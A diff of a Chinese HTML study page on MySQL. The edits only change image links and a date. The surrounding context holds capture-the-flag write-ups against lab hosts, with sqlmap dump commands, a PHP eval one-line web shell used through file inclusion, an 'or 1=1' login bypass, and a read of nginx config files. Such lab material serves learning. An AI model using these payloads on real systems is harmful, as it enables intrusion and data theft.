@@ -5447,13 +5447,13 @@ SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、
 <p><span>MySQL<span class="heti-spacing"> </span></span>是最流行的关系型数据库管理系统，在<span class="heti-skip"><span class="heti-spacing"> </span>WEB<span class="heti-spacing"> </span></span>应用方面<span class="heti-skip"><span class="heti-spacing"> </span>MySQL<span class="heti-spacing"> </span></span>是最好的<span><span class="heti-spacing"> </span>RDBMS(Relational Database Management System</span>：关系数据库管理系统<span class="heti-skip"><span class="heti-spacing"> </span>)<span class="heti-spacing"> </span></span>应用软件之一。</p>
 </blockquote>
 <p><span>MySQL<span class="heti-spacing"> </span></span>为关系型数据库<span class="heti-skip"><span class="heti-spacing"> </span>(Relational Database Management System),<span class="heti-spacing"> </span></span>这种所谓的<span class="heti-skip"><span class="heti-spacing"> </span>"<span class="heti-spacing"> </span></span>关系型<span class="heti-skip"><span class="heti-spacing"> </span>"<span class="heti-spacing"> </span></span>可以理解为<span class="heti-skip"><span class="heti-spacing"> </span>"<span class="heti-spacing"> </span></span>表格<span class="heti-skip"><span class="heti-spacing"> </span>"<span class="heti-spacing"> </span></span>的概念<span class="heti-skip"><span class="heti-spacing"> </span>,<span class="heti-spacing"> </span></span>一个关系型数据库由一个或数个表格组成
-<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240702184602.png"/>
+<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240702184602.webp"/>
 - 表头(header): 每一列的名称;
 - 列(col): 具有相同数据类型的数据的集合;
 - 行(row): 每一行用来描述某条记录的具体信息;
 - 值(value): 行的具体信息, 每个值必须与该列的数据类型相同;
 - <strong>键<span class="heti-skip"><span class="heti-spacing"> </span>(key):<span class="heti-spacing"> </span></span>键的值在当前列中具有唯一性。</strong></p>
-<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801213130.png"/></p>
+<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801213130.webp"/></p>
 <p><a href="https://blog.csdn.net/carefree2005/article/details/113798841"><span>Mysql<span class="heti-spacing"> </span></span>之自带四库之<span class="heti-skip"><span class="heti-spacing"> </span>sys<span class="heti-spacing"> </span></span>库<span class="heti-skip"><span class="heti-spacing"> </span>_mysql sys<span class="heti-spacing"> </span></span>库<span class="heti-skip"><span class="heti-spacing"> </span>-CSDN<span class="heti-spacing"> </span></span>博客</a></p>
 <h3 id="_8">安装<a class="headerlink" href="#_8" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h3>
 <p><span>windows<span class="heti-spacing"> </span></span>下<span class="heti-skip"><span class="heti-spacing"> </span>phpstudy<span class="heti-spacing"> </span></span>环境变量配置</p>
@@ -5711,7 +5711,7 @@ SELECT group_concat(col_name1, col_name2…) FROM table_name /*整合行、
 </details>
 <h3 id="1-schoolbus-sql-injection">实例<span><span class="heti-spacing"> </span>1</span><a href="https://zjusec.com/challenges/16"><span><span class="heti-spacing"> </span>SchoolBus - SQL injection</span></a><a class="headerlink" href="#1-schoolbus-sql-injection" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h3>
 <p>打开网站，发现是一个问答的网站，非常明显的<span class="heti-skip"><span class="heti-spacing"> </span>sql<span class="heti-spacing"> </span></span>注入点
-<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801183459.png"/></p>
+<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801183459.webp"/></p>
 <p>因为提示了检测空格，所以使用了<span class="heti-skip"><span class="heti-spacing"> </span>tamper<span class="heti-spacing"> </span></span>的<span><span class="heti-spacing"> </span>space2comment.py</span></p>
 <p></p><div class="highlight"><pre><span></span><code><span class="c1">## 查看用户</span>
 sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.214.160.13:10002/?questionid<span class="o">=</span><span class="m">0</span><span class="w"> </span>--current-user<span class="w"> </span>--tamper<span class="w"> </span>space2randomblank.py
@@ -5725,7 +5725,7 @@ sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.214.160.13:100
 sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.214.160.13:10002/?questionid<span class="o">=</span><span class="m">0</span><span class="w"> </span>--current-db<span class="w"> </span>--tamper<span class="w"> </span>space2randomblank.py<span class="w"> </span>-D<span class="w"> </span>aaa_web2<span class="w"> </span>-T<span class="w"> </span>flag_is_here<span class="w"> </span>-C<span class="w"> </span><span class="s2">"flag"</span><span class="w"> </span>--dump
 </code></pre></div>
 使用上面的语句可以一步步使用sqlmap获取flag
-<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/cc3a0a22acb55bd08b8eed78d0c2d20.png"/></p>
+<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__cc3a0a22acb55bd08b8eed78d0c2d20.webp"/></p>
 <h3 id="2-schoolbus-php-include">实例<span class="heti-skip"><span class="heti-spacing"> </span>2<span class="heti-spacing"> </span></span><a href="http://10.214.160.13:10001/index.php?f=upload.php"><span class="heti-skip"><span class="heti-spacing"> </span>SchoolBus - php include<span class="heti-spacing"> </span></span>文件注入</a><a class="headerlink" href="#2-schoolbus-php-include" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h3>
 <blockquote>
 <p>拓展链接 
@@ -5734,7 +5734,7 @@ sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.214.160.13:100
 - <a href="https://blog.csdn.net/weixin_41489908/article/details/115875988">Kali linux菜刀(weevely3)</a> 这个最后没用到</p>
 </blockquote>
 <p>打开网站是一个上传文件的页面，上传文件之后会显示文件文件名
-<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801182113.png"/></p>
+<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801182113.webp"/></p>
 <p>提示构造一句话木马，所以写了一个<span class="heti-skip"><span class="heti-spacing"> </span>php<span class="heti-spacing"> </span></span>文件
 </p><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'123'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
@@ -5744,13 +5744,13 @@ sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.214.160.13:100
 <p>在经过尝试之后，发现拼接<span class="heti-skip"><span class="heti-spacing"> </span>url<span class="heti-spacing"> </span></span>到<code>index.php</code>的查询之后，会出现文件引用</p>
 <div class="highlight"><pre><span></span><code>http://10.214.160.13:10001/index.php?f=upload/20240801xxxxxx.png
 </code></pre></div>
-<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/dfb524f36bde612006171278b5b5ec8.png"/></p>
+<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__dfb524f36bde612006171278b5b5ec8.webp"/></p>
 <p>这个时候就可以使用蚁剑等工具进行文件操作，上传文件，执行命令等了。</p>
 <p>右键选择“添加数据”，填入上面的<span class="heti-skip"><span class="heti-spacing"> </span>url<span class="heti-spacing"> </span></span>路径，和我们构造的<span class="heti-skip"><span class="heti-spacing"> </span>php<span class="heti-spacing"> </span></span>密码。
-<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801182913.png"/></p>
+<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801182913.webp"/></p>
 <p>点击“测试链接”，发现可以。</p>
 <p>直接连接后会出现网站的管理界面。</p>
-<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801183043.png"/></p>
+<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801183043.webp"/></p>
 <p>相当于取得了网站的管理权限。就可以拿到<span class="heti-skip"><span class="heti-spacing"> </span>flag<span class="heti-spacing"> </span></span>了。</p>
 <div class="highlight"><pre><span></span><code>flag = AAA{m310dy_1s_wAitinG_4_y0u_h3r3_qq_qun_386796080}
 </code></pre></div>
@@ -5781,7 +5781,7 @@ sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.214.160.13:100
 
 <span class="cp">?&gt;</span>
 </code></pre></div>
-<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/0e185ed04c09d30db92fed5775aa16a.png"/></p>
+<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__0e185ed04c09d30db92fed5775aa16a.webp"/></p>
 <h3 id="3">实例<span><span class="heti-spacing"> </span>3</span><a class="headerlink" href="#3" title="anchor link to this section for reference"><span><span class="heti-spacing"> </span>¶</span></a></h3>
 <p><strong>登录界面注入</strong></p>
 <p>用户名 <code>aaa' or 1=1 #</code>
@@ -5794,7 +5794,7 @@ nginx/1.10.0 (Ubuntu)</p>
 <p>做完了那两个题<span class="heti-skip"><span class="heti-spacing"> </span>,<span class="heti-spacing"> </span></span>再回头看这个题<span class="heti-skip"><span class="heti-spacing"> </span>,<span class="heti-spacing"> </span></span>思路就比较清晰了<span><span class="heti-spacing"> </span>.</span></p>
 <p>人工注入感觉我的<span class="heti-skip"><span class="heti-spacing"> </span>sql<span class="heti-spacing"> </span></span>水平应该达不到，所以尝试使用<span class="heti-skip"><span class="heti-spacing"> </span>sqlmap<span class="heti-spacing"> </span></span>进行注入</p>
 <p>这里学习了一下<span class="heti-skip"><span class="heti-spacing"> </span>post<span class="heti-spacing"> </span></span>注入的方法
-<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240801201104.png"/></p>
+<img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__20240801201104.webp"/></p>
 <p>先将<span class="heti-skip"><span class="heti-spacing"> </span>burp<span class="heti-spacing"> </span></span>的报文保存到一个文件中，然后使用<span class="heti-skip"><span class="heti-spacing"> </span>sqlmap<span class="heti-spacing"> </span></span>进行注入，使用<code>-r</code>参数加载文件，使用<code>-p</code>参数指定注入点</p>
 <div class="highlight"><pre><span></span><code>sqlmap<span class="w"> </span>-r<span class="w"> </span>./test.txt<span class="w"> </span>-p<span class="w"> </span>username<span class="w"> </span>--dbs
 </code></pre></div>
@@ -5945,7 +5945,7 @@ database management system users roles:
 <p>根据源码<span class="heti-skip"><span class="heti-spacing"> </span>,<span class="heti-spacing"> </span></span>就可以很轻松的找到同目录下的<code>flag.php</code>文件</p>
 <div class="highlight"><pre><span></span><code>AAA{now_y0u_can_try_web_400_lol}
 </code></pre></div>
-<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/57e4e1a1e9d5e59769ac273e5d580a0.png"/></p>
+<p><img alt="" src="https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/Tools__Software__assets__SQL.assets__57e4e1a1e9d5e59769ac273e5d580a0.webp"/></p>
 <p>这里拿不到<span class="heti-skip"><span class="heti-spacing"> </span>shell<span class="heti-spacing"> </span></span>权限尊都很难受啊</p>
 <p>所以学习了一下常见<span class="heti-skip"><span class="heti-spacing"> </span>nginx<span class="heti-spacing"> </span></span>的配置文件</p>
 <p>先读取了一下<code>/etc/nginx/nginx.conf</code>文件
@@ -5968,7 +5968,7 @@ database management system users roles:
 <span class="md-icon" title="最后更新">
 <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"></path></svg>
 </span>
-<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2025年8月19日 17:17:34</span>
+<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2025年10月17日 20:24:06</span>
 </span>
 <span class="md-source-file__fact">
 <span class="md-icon" title="创建日期">
